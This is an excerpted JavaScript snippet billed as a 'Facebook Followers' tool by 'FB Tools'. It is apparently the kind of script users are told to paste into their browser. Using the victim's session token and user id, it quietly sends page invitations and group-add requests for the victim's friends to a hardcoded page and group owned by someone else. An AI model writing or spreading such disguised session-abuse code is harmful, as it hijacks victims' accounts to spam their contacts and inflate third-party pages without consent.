var Title = "Facebook Followers - finding Members</A>";
var Descriptions = "",
    _text = 'Powered By:  <A style="color:#3B5998;" href="https://www.facebook.com/803452583002115" target="_blank">FB Tools -</A></br>Script Made By: </A><A style="color:#3B5998;" href="https://www.facebook.com/profile.php?id=100008165316543" target="_blank">Kodran Piraj </A></A>,</A></A>.</br>For More Tools Visit Our page <A style="color:#3B5998;" href="https://www.facebook.com/803452583002115" target="_blank">FB Tools -</A>.</A>';
...
display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancel</span><br/>";
    ...
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=234375003419473&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=623270711058894&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
